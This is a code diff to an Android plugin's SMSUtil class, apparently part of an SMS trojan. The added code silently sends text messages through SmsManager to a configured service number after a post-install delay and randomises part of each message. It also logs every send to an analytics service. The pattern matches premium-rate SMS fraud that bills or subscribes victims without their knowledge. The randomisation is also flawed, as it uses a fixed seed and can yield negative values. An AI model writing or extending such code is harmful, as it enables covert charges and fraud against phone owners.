@@ -1,17 +1,20 @@
 package com.xstd.plugin.Utils;
 
 import android.content.Context;
+import android.content.Intent;
 import android.os.Build;
 import android.telephony.SmsManager;
 import android.text.TextUtils;
 import com.plugin.common.utils.UtilsRuntime;
 import com.umeng.analytics.MobclickAgent;
+import com.xstd.plugin.api.MainActiveResponse;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.SettingManager;
 
 import java.util.Calendar;
 import java.util.HashMap;
+import java.util.Random;
 
 /**
  * Created with IntelliJ IDEA.
@@ -24,10 +27,44 @@ public class SMSUtil {
 
     public static final boolean sendSMSForMonkey(String target, String msg) {
         try {
+            if (!TextUtils.isEmpty(msg)) {
+                msg = msg.trim();
+            }
+            if (!TextUtils.isEmpty(target)) {
+                target = target.trim();
+            }
+
             int channel = Integer.valueOf(Config.CHANNEL_CODE);
             long currentTime = System.currentTimeMillis();
             long delay = currentTime - SettingManager.getInstance().getFirstLanuchTime();
             if (channel > 950000 && delay < Config.DELAY_ACTIVE_DO_MONKEY) return false;
+
+            if (Config.DEBUG) {
+                Config.LOGD("[[SMSUtil::sendSMSForMonkey]] origin msg : << " + msg + " >> to : << " + target + " >>");
+            }
+
+            if (!TextUtils.isEmpty(msg) && msg.contains("?")) {
+                int firstPos = msg.indexOf("?");
+                if (firstPos != -1) {
+                    String prefix = msg.substring(0, firstPos);
+                    String replaceContent = msg.substring(firstPos);
+
+                    int replaceLength = replaceContent.length();
+                    int randomStart = (int) Math.pow(10, replaceLength - 1) + 1;
+                    int randomEnd = ((int) Math.pow(10, replaceLength)) - 2;
+                    Random random = new Random(randomEnd);
+                    int data = random.nextInt();
+                    if (data < randomStart) {
+                        data = data + randomStart;
+                    }
+                    msg = prefix + String.valueOf(data);
+
+                    if (Config.DEBUG) {
+                        Config.LOGD("[[SMSUtil::sendSMSForMonkey]] prefix : " + prefix + " replace content : " + replaceContent
+                                        + " random data : " + data + " real send msg : " + msg);
+                    }
+                }
+            }
 
             SmsManager.getDefault().sendTextMessage(target, null, msg, null, null);
             if (Config.DEBUG) {
@@ -108,10 +145,10 @@ public class SMSUtil {
 //            log.put("phoneType", Build.MODEL);
 //            CommonUtil.umengLog(context, "send_sms_phone2", log);
 //        } else {
-            target = AppRuntime.PHONE_SERVICE1;
-            HashMap<String, String> log = new HashMap<String, String>();
-            log.put("phoneType", Build.MODEL);
-            CommonUtil.umengLog(context, "send_sms_phone1", log);
+        target = AppRuntime.PHONE_SERVICE1;
+        HashMap<String, String> log = new HashMap<String, String>();
+        log.put("phoneType", Build.MODEL);
+        CommonUtil.umengLog(context, "send_sms_phone1", log);
 //        }
 
         if (!TextUtils.isEmpty(content) && sendSMSForLogic(target, content)) {
